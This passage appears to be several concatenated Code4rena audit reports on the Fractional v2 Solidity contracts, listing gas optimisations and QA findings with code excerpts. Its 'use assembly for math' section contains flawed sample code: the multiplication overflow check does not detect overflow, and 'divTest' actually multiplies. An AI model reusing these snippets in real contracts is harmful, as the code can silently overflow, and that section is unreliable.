[FERC1155.sol#L86](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L86) [Buyout.sol#L139](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L139) [Buyout.sol#L176](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L176) [Migration.sol#L123-L124](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L123-L124) [Migration.sol#L134-L135](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L134-L135)  [Migration.sol#L156](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L156) [Migration.sol#L160](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L160)   ### [G06] Minimise SLOAD's Whenever referencing a state variable more than once in a function without modifying it, you can save ~97 gas per use by caching the value. (normally 100 gas each use vs 103 gas to SLOAD/MSTORE for the first use and then only 3 gas for further uses)  [FERC1155.sol#L246-L247](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L246-L247) - can cache royaltyPercent[_ id])(save ~94 gas) [FERC1155.sol#L303-L305](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L303-L305) - can cache _ controller (save ~94 gas) [Buyout.sol#L476-L477](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L476-L477) - can cache supply (save ~94 gas) [Buyout.sol#L482-L501](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L482-L501) - can cache transfer (save ~679 gas) [Migration.sol#L81-L95](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L81-L95) - can cache registry (save ~94 gas)   ### [G07] Deleting Mappings is Cheaper than setting to Default Value Based on this test in remix you can save ~511 gas in deployment costs and ~6 gas on each function call by using delete instead of setting a mapping to the default value.  ``` solidity contract Test {  mapping (address => uint256) public withdrawals;  function test(address a) external {   withdrawals[a] = 0;   (Deployment cost: 180,368, Execution cost: 27,820)   vs   delete withdrawals[a];   (Deployment cost: 179,857, Execution cost: 27,814)  } } ```  Instances where mappings are being set to their default value: [Vault.sol#L105](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L105) [Migration.sol#L161](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L161) [Migration.sol#L323](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L323) [Migration.sol#L157](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L157) [Migration.sol#L310](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L310)   ### [G08] Functions that can be Payable Functions that will always revert when regular users call them (such as those that can only be called by owner/controller) can be marked payable to save a small amount of gas (~24 Gas when function is called based on remix test)  [FERC1155.sol#L205-L207](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L205-L207) [FERC1155.sol#L198](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L198) [FERC1155.sol#L217-L221](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L217-L221) [FERC1155.sol#L229-L231](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L229-L231) [Vault.sol#L73](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73) [Vault.sol#L86](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L86) [Vault.sol#L93](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L93) [Vault.sol#L101](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L101)   ### [G09] Public Function that can be External The following functions are never called in their contracts and can be switched from public to external to save gas: [MerkleBase.sol#L43-L47](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L43-L47) [MerkleBase.sol#L61](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L61) [MerkleBase.sol#L73-L74](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L73-L74) [Metadata.sol#L36](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/Metadata.sol#L36) [SelfPermit.sol#L18-L26](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/SelfPermit.sol#L18-L26) [SelfPermit.sol#L46-L53](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/SelfPermit.sol#L46-L53)
# QA Report  # Documentation errors.  Some of the documentation mentions that Buyouts need 51% support but the code shows that, in reality, it is anything strictly greater than 50%. e.g. 50.0001%  See [Buyout.sol:208-211](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L208-L211)  # Non-critical: Use `permissions.size` to intialize `nodes` in `Buyout.getLeafNodes`  Instead of using the magic number 5 on [line 451](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L451) why not simply use `permissions.length` to allocate the correct number of array indices?  Like so:  ```solidity function getLeafNodes() external view returns (bytes32[] memory nodes) {     Permission[] memory permissions = getPermissions();     nodes = new bytes32[](permissions.length);     for (uint256 i; i < permissions.length; ) {         // Hashes permission into leaf node         nodes[i] = keccak256(abi.encode(permissions[i]));         // Can't overflow since loop is a fixed size         unchecked {             ++i;         }     } } ```  ## Low Risk: `BaseVault.generateMerkleTree` will not work with new targets when total leaf length is greater than 6  ### Impact  Function `BaseVault.deployVault` takes a `modules` parameter which allows for any set of modules to be used with the contract.  If those modules have targets which have a total number of leaf nodes greater than 6 then `generateMerkleTree` will revert, which in turn causes `deployVault` to revert.  The impact is that one can successfully create a `BaseVault` but not call `deployVault`.  ### Proof of Concept  - Create a new instance of `BaseVault` called `baseVault`. - Call `baseVault.deployVault` with [modules](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L36) parameter which, collectively, have more than 6 leaf nodes. - Observe a revert with "Index out of bounds"  ### Tools used  Manual Inspection  ### Recommended Mitigation Steps  If the intention of `BaseVault` is to allow arbitrary modules then one could rewrite `generateMerkleTree` as follows.  ```solidity function generateMerkleTree(address[] calldata _modules)     public     view     returns (bytes32[] memory hashes) {     uint256 numLeaves;     uint256 counter;     bytes32[][] memory leavesList = new bytes32[][](_modules.length);      // Get leaf nodes      unchecked {         for (uint256 i; i < _modules.length; ++i) {             bytes32[] memory leaves = IModule(_modules[i]).getLeafNodes();             leavesList[i] = leaves;             numLeaves += leaves.length;         }     }      hashes = new bytes32[](numLeaves);     unchecked {         for (uint256 i; i < leavesList.length; ++i) {             bytes32[] memory leaves = leavesList[i];             for (uint256 j; j < leaves.length; ++j) {                 hashes[counter++] = leaves[j];             }         }     } } ```  If the intention is for it only to allow `Supply` and `Buyout` modules then simply add some checks with `require` statements.  ## Low Risk: There is no way to get ETH out of `Vault` when accidentally sent to it  There is no function to retrieve ETH accidentally sent to the `Vault` contract.  ## Low Risk: `BaseVault` batch deposit functions do not check arrays are of the same length  The functions `batchDepositERC20`, `batchDepositERC721`, and `batchDepositERC1155` all fail to check that the length of the their array arguments have the same length.  Although this only results in a revert, it will result in increased gas use.
# Summary | Issue | Instances | | ------ | :--------: | | `++i` uses less gas compared to `i++` | 3 | | `uint8` incures more gas overhead compared to `uint256` | 2 | | Use custom errors instead of `revert()`/`require()` to save gas | 3 | | Add `require()` earlier in functions | 1 | | Cache array length outside of loop | 4 | | `internal` functions that are only called once can be inlined to save gas | 5 | | Return values directly without an intermediate return variable | 6 |  | Let the default value `0` be applied to variables initialized to `0` | 2 | | Functions guaranteed to revert when called by normal users can be marked `payable` | 8 | | `public` functions not called by the contract should be declared `external` | 6 |     # Gas Optimisations  ## `++i` uses less gas compared to `i++`   This is especially relevant for the use of `i++` in `for` loops. This saves 6 gas per loop.   _There are 3 instances of this issue:_  ``` File: src/Vault.sol  78     for (uint256 i = 0; i < length; i++) { 79         methods[_selectors[i]] = _plugins[i]; 80:    } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L78-L80  ``` File: src/Vault.sol  104    for (uint256 i = 0; i < length; i++) { 105        methods[_selectors[i]] = address(0); 106:   } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L104-L106  ``` File:  src/utils/MerkelBase.sol  186    while (x > 0) { 187       x >>= 1; 188       ceil++; 189:   } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L186-L189  ## `uint8` incures more gas overhead compared to `uint256`  _There are 2 instances of this issue:_  ``` File: src/FERC1155.sol  98    function permit( 99        address _owner, 100        address _operator, 101        uint256 _id, 102        bool _approved, 103        uint256 _deadline, 104        uint8 _v, 105        bytes32 _r, 106        bytes32 _s 107:    ) external { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L98-L107  ``` File: src/FERC1155.sol  145    function permitAll( 146        address _owner, 147        address _operator, 148        bool _approved, 149        uint256 _deadline, 150        uint8 _v, 151        bytes32 _r, 152        bytes32 _s 153:    ) external { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L145-L153  ## Use custom errors instead of `revert()`/`require()` to save gas Custom errors are available from solidity version 0.8.4. The instances below match or exceed that version.  _There are 3 instances of this issue:_  ``` File: src/FERC1155.sol  263  require( 264  msg.sender == _from || 265   isApprovedForAll[_from][msg.sender] || 267   isApproved[_from][msg.sender][_id], 268  "NOT_AUTHORIZED" 269: ); ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L263-L269  ``` File: src/FERC1155.sol  275  require( 276  _to.code.length == 0 277   ? _to != address(0) 278   : INFTReceiver(_to).onERC1155Received( 279    msg.sender, 280    _from, 281    _id, 282    _amount, 283    _data 284   ) == INFTReceiver.onERC1155Received.selector, 285  "UNSAFE_RECIPIENT" 286:  ); ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L275-L286  ``` File: src/FERC1155.sol  297: require(metadata[_id] != address(0), "NO METADATA"); ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L297   ## Add `require()` earlier in functions This saves gas on operations between the start of the function and where the `require` function is actually being called.   _There is 1 instance of this issue:_  ``` File: src/FERC1155.sol  276  require( 277  _to.code.length == 0 278   ? _to != address(0) 279   : INFTReceiver(_to).onERC1155Received( 280    msg.sender, 281    _from, 282    _id, 283    _amount, 284    _data 285   ) == INFTReceiver.onERC1155Received.selector, 286  "UNSAFE_RECIPIENT" 287:  ); ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L276-L287   ## Cache array length outside of loop Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  Caching the array length in the stack saves around 3 gas per iteration. To do this, create a variables containing the array length before the loop.    _There are 4 instances of this issue:_  ``` File: src/modules/Buyout.sol  276:  for (uint256 i; i < permissions.length; ) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L454  ``` File: src/utils/MerkleBase.sol  51:  for (uint256 i = 0; i < _proof.length; ++i) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L51  ``` File: src/utils/MerkleBase.sol  63:   while (_data.length > 1) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L63  ``` File: src/utils/MerkleBase.sol  110: for (uint256 i; i < result.length; ++i) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L110   ## `internal` functions that are only called once can be inlined to save gas Depending on the function contents, this will save 20~40 gas by omiting two JUMP operations and stack operations needed for the function call.   _There are 5 instances of this issue:_  ``` File: src/FERC1155.sol  324  function _computePermitStructHash( 325    address _owner, 326    address _operator, 327    uint256 _id, 328    bool _approved, 329    uint256 _deadline 330:  ) internal returns (bytes32) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L324-L330  ``` File: src/FERC1155.sol  350    function _computePermitAllStructHash( 351        address _owner, 352        address _operator, 353        bool _approved, 354        uint256 _deadline 355:   ) internal returns (bytes32) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L350-L355  ``` File: src/Vault.sol  142    function _revertedWithReason(bytes memory _response) internal pure { 143        assembly { 144            let returndata_size := mload(_response) 145            revert(add(32, _response), returndata_size) 146        } 147:    } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L142-L147  ``` File: src/utils/Multicall.sol  39    function _revertedWithReason(bytes memory _response) internal pure { 40        assembly { 41            let returndata_size := mload(_response) 42            revert(add(32, _response), returndata_size) 43        } 44:    } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/Multicall.sol#L39-L44  ``` File: src/utils/SafeSend.sol  18    function _attemptETHTransfer(address _to, uint256 _value) 19        internal 20        returns (bool success) 21:    { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/SafeSend.sol#L18-L21  ## Return values directly without an intermediate return variable Initializing a return variable for a function, then assigning a value to it requires more gas compared to simply returning the value, as long as the variable is not being used elsewhere in the function.   _There are 6 instances of this issue:_  ``` File: src/Vault.sol  67:  (success, response) = _execute(_target, _data); ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L49-L68  ``` File: src/VaultFactory.sol  26    function deploy() external returns (address payable vault) { 27        vault = deployFor(msg.sender); 28:    } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultFactory.sol#L26-L28  ``` File: src/VaultFactory.sol  49:        vault = address(uint160(uint256(data))); ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultFactory.sol#L33-L50  ``` File: src/VaultRegistry.sol  51    function create( 52        bytes32 _merkleRoot, 53       address[] memory _plugins, 54        bytes4[] memory _selectors 55    ) external returns (address vault) { 56        vault = _deployVault(_merkleRoot, address(fNFT), _plugins, _selectors); 57:   } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L51-L57  ``` File: src/VaultRegistry.sol  83    function createCollection( 84        bytes32 _merkleRoot, 85        address[] memory _plugins, 86        bytes4[] memory _selectors 87    ) external returns (address vault, address token) { 88        (vault, token) = createCollectionFor( 89            _merkleRoot, 90            msg.sender, 91            _plugins, 92            _selectors 93        ); 94:   } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L83-L94  ``` File: src/VaultRegistry.sol  102    function createInCollection( 103        bytes32 _merkleRoot, 104        address _token, 105        address[] memory _plugins, 106        bytes4[] memory _selectors 107    ) external returns (address vault) { 108        address controller = FERC1155(_token).controller(); 109        if (controller != msg.sender) 110            revert InvalidController(controller, msg.sender); 111        vault = _deployVault(_merkleRoot, _token, _plugins, _selectors); 112:   } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L102-L112  ## Let the default value `0` be applied to variables initialized to `0` Letting the default value of `0` be initialized to variables costs less gas compared to initializing it to a value of `0`.   _There are 2 instances of this issue:_  ``` File: src/Vault.sol  78:   for (uint256 i = 0; i < length; i++) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L78  ``` File: src/utils/MerkleBase.sol  51:   for (uint256 i = 0; i < _proof.length; ++i) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L51   ## Functions guaranteed to revert when called by normal users can be marked `payable`  For example, a function modifier such as `onlyController` is used. Adding the `payable` marker will lower gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. Saves about 21 gas per call to the function, as well as saving on deployment cost.   _There are 8 instances of this issue:_  ``` File: src/FERC1155.sol  56    function burn( 57        address _from, 58        uint256 _id, 59        uint256 _amount 60:    ) external onlyRegistry { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L56-L60  ``` File: src/FERC1155.sol  79    function mint( 80        address _to, 81        uint256 _id, 82        uint256 _amount, 83        bytes memory _data 84:   ) external onlyRegistry { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L79-L84  ``` File: src/FERC1155.sol  198:   function setContractURI(string calldata _uri) external onlyController { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L198  ``` File: src/FERC1155.sol  205    function setMetadata(address _metadata, uint256 _id) 206        external 207        onlyController 208:   { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L205-L208  ``` File: src/FERC1155.sol  217    function setRoyalties( 218        uint256 _id, 219        address _receiver, 220        uint256 _percentage 221:   ) external onlyController { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L217-L221  ``` File: src/FERC1155.sol  229    function transferController(address _newController) 230        external 231        onlyController 232:   { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L229-L232  ``` File: src/VaultRegistry.sol  39    function burn(address _from, uint256 _value) external { 40        VaultInfo memory info = vaultToToken[msg.sender]; 41        uint256 id = info.id; 42        if (id == 0) revert UnregisteredVault(msg.sender); 43        FERC1155(info.token).burn(_from, id, _value); 44:    } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L39-L44  ``` File: src/VaultRegistry.sol  117    function mint(address _to, uint256 _value) external { 118        VaultInfo memory info = vaultToToken[msg.sender]; 119        uint256 id = info.id; 120        if (id == 0) revert UnregisteredVault(msg.sender); 121        FERC1155(info.token).mint(_to, id, _value, ""); 122:   } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L117-L122  ## `public` functions not called by the contract should be declared `external`  Contracts are allowed to override their parents' functions and change the visibility from `external` to `public` if required.    _There are 6 instances of this issue:_  ``` File: src/FERC1155.sol  256    function safeTransferFrom( 257        address _from, 258        address _to, 259        uint256 _id, 260        uint256 _amount, 261        bytes memory _data 262:    ) public override(ERC1155, IFERC1155) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L256-L262  ``` File: src/FERC1155.sol  291    function uri(uint256 _id) 292        public 293        view 294        override(ERC1155, IFERC1155) 295        returns (string memory) 296:    { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L291-L296  ``` File: src/utils/MerkleBase.sol  43    function verifyProof( 44        bytes32 _root, 45        bytes32[] memory _proof, 46        bytes32 _valueToProve 47:   ) public pure returns (bool) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L43-L47  ``` File: src/utils/MerkleBase.sol  61:    function getRoot(bytes32[] memory _data) public pure returns (bytes32) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L61  ``` File: src/utils/MerkleBase.sol  73    function getProof(bytes32[] memory _data, uint256 _node) 74        public 75        pure 76        returns (bytes32[] memory) 77:   { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L73-L77  ``` File: src/utils/Metadata.sol  36    function uri(uint256 _id) public view returns (string memory) { 37        return tokenMetadata[_id]; 38:    } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/Metadata.sol#L36-L38
# Gas Optimizations The following sections detail the gas optimizations found throughout the codebase. Each optimization is documented with the setup, an explainer for the optimization, a gas report and line identifiers for each optimization across the codebase. For each section's gas report, the optimizer was turned on and set to 10000 runs. You can replicate any tests/gas reports by heading to [0xKitsune/gas-lab](https://github.com/0xKitsune/gas-lab) and cloning the repo. Then, simply copy/paste the contract examples from any section and run `forge test --gas-report`. You can also easily update the optimizer runs in the `foundry.toml`.  ---     ## Use assembly for math (add, sub, mul, div)  Use assembly for math instead of Solidity. You can check for overflow/underflow in assembly to ensure safety. If using Solidity versions < 0.8.0 and you are using Safemath, you can gain significant gas savings by using assembly to calculate values and checking for overflow/underflow.  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2 c2;     Contract3 c3;     Contract4 c4;     Contract5 c5;     Contract6 c6;     Contract7 c7;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();         c3 = new Contract3();         c4 = new Contract4();         c5 = new Contract5();         c6 = new Contract6();         c7 = new Contract7();     }      function testGas() public {         c0.addTest(34598345, 100);         c1.addAssemblyTest(34598345, 100);         c2.subTest(34598345, 100);         c3.subAssemblyTest(34598345, 100);         c4.mulTest(34598345, 100);         c5.mulAssemblyTest(34598345, 100);         c6.divTest(34598345, 100);         c7.divAssemblyTest(34598345, 100);     } }  contract Contract0 {     //addition in Solidity     function addTest(uint256 a, uint256 b) public pure {         uint256 c = a + b;     } }  contract Contract1 {     //addition in assembly     function addAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := add(a, b)              if lt(c, a) {                 mstore(0x00, "overflow")                 revert(0x00, 0x20)             }         }     } }  contract Contract2 {     //subtraction in Solidity     function subTest(uint256 a, uint256 b) public pure {         uint256 c = a - b;     } }  contract Contract3 {     //subtraction in assembly     function subAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := sub(a, b)              if gt(c, a) {                 mstore(0x00, "underflow")                 revert(0x00, 0x20)             }         }     } }  contract Contract4 {     //multiplication in Solidity     function mulTest(uint256 a, uint256 b) public pure {         uint256 c = a * b;     } }  contract Contract5 {     //multiplication in assembly     function mulAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := mul(a, b)              if lt(c, a) {                 mstore(0x00, "overflow")                 revert(0x00, 0x20)             }         }     } }  contract Contract6 {     //division in Solidity     function divTest(uint256 a, uint256 b) public pure {         uint256 c = a * b;     } }  contract Contract7 {     //division in assembly     function divAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := div(a, b)              if gt(c, a) {                 mstore(0x00, "underflow")                 revert(0x00, 0x20)             }         }     } }   ```  ### Gas Report  ```js  ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract0 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 40493              ┆ 233             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ addTest            ┆ 303             ┆ 303 ┆ 303    ┆ 303 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37087              ┆ 216             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ addAssemblyTest    ┆ 263             ┆ 263 ┆ 263    ┆ 263 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract2 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 40293              ┆ 232             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ subTest            ┆ 300             ┆ 300 ┆ 300    ┆ 